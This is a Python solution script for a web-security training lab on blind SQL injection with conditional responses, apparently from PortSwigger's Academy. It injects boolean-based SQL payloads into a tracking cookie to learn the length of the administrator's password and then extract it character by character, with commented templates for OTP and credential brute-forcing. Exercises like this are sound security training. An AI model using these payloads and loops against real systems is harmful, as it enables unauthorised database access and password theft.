# SQL injection 31 of 51
# Lab: Blind SQL injection with conditional responses

import asyncio
from common.base import run_payloads

# RAW request (from Burp Intruder) with placeholders like §1§, §2§... or §CODE§, §USER§
RAW_REQUEST = """
GET /filter?category=Lifestyle HTTP/2
Host: 0aec005403ca4a7c806417480036004c.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: https://0aec005403ca4a7c806417480036004c.web-security-academy.net/
Cookie: session=82I7xBGaFOMUdTk3o3FPadGIQQzReBlw; TrackingId=bh6vTqcFvtLtdwPv@@@QUERY@@@
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
""".strip()

def generate_payloads_examples():
    """
    Change this function depending on your needs.
    Returns something like this: {"§PLACEHOLDER§": "VALUE"}
    """

    import string

    # One-shot payload (no placeholders)
    # return [{}]

    for pos in range(1, 21):

        for l in string.ascii_lowercase:
            yield {"§LETTER§": l, "§POS§": pos}
        for l in string.ascii_uppercase:
            yield {"§LETTER§": l, "§POS§": pos}
        for n in range(10):
            yield {"§LETTER§": str(n), "§POS§": pos}

    # for n in range(2,30):
    #    yield {"§len§": n}
    
    # EXAMPLE 1: Single payload (4-digits OTP)
    #for otp in generate_otps(length=4):
    #    yield {"§CODE§": otp}

    # EXAMPLE 2: Multi-payload / Cluster Bomb (Username + Password)
    # usernames = ["admin", "carlos", "wiener"]
    # passwords = generate_wordlist("passwords.txt")
    # for user, pwd in itertools.product(usernames, passwords):
    #     yield {"§USER§": user, "§PASS§": pwd}

    # EXAMPLE 3: Pitchfork (Coupled values 1:1)
    # for user, pwd in zip(users_list, pass_list):
    #     yield {"§USER§": user, "§PASS§": pwd}

def check_victory (response):
    """Check if the response is a victory condition."""
    # return True
    return response.status_code == 200 and ("Welcome" in response.text)
    # return response.status_code == 302 # and "Location" in response.headers


# Generator for phase 1
def gen_length_payloads(max_len=40, placeholder="§len§"):
    """Yield payloads to test different lengths."""
    for n in range(1, max_len + 1):
        yield {placeholder: n}

# Generator for phase 2
def gen_char_payloads_for_pos(pos, charset=None, pos_placeholder="§POS§", letter_placeholder="§LETTER§"):
    """Yield payloads to test characters for a specific position."""
    import string
    if charset is None:
        charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
    for ch in charset:
        yield {pos_placeholder: pos, letter_placeholder: ch}


async def brute_force_password(max_len=40, charset=None):
    """High-level two-phase brute-force:
    1) discover length using `§len§` placeholder
    2) for each position, discover a single character using `§POS§` and `§LETTER§` placeholders

    Returns the discovered password or None on failure.
    """

    # Phase 1: discover length
    raw_req = RAW_REQUEST.replace("@@@QUERY@@@", """'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=§len§)='a""")
    length_result = await run_payloads(raw_req, gen_length_payloads(max_len), check_victory)
    if not length_result:
        return None

    # extract length from payload dict (assumes single key)
    found_len = None
    for v in length_result['payload'].values():
        try:
            found_len = int(v)
            break
        except Exception:
            continue

    if not found_len:
        return None

    password = ''
    raw_req = RAW_REQUEST.replace("@@@QUERY@@@", """'+AND+(SELECT+SUBSTRING(password,§POS§,1)+FROM+users+WHERE+username='administrator')='§LETTER§""")
    for pos in range(1, found_len + 1):
        res = await run_payloads(raw_req, gen_char_payloads_for_pos(pos, charset), check_victory)
        if not res:
            # could not find char for this position
            return None
        # assume payload contains §LETTER§ value
        letter = None
        for k, v in res['payload'].items():
            if k.startswith('§'):
                # heuristic: if key contains LETTER or POS
                if 'LETTER' in k or 'letter' in k or 'POS' not in k:
                    letter = v
                    break
        if letter is None:
            # fallback: take first value
            letter = list(res['payload'].values())[0]
        password += str(letter)

    return password

async def main():
    result = await brute_force_password()
    if result:
        print(f"\n[>] Winner: {result}")
    else:
        print("\n[-] No valid payload found.")

if __name__ == "__main__":
    asyncio.run(main())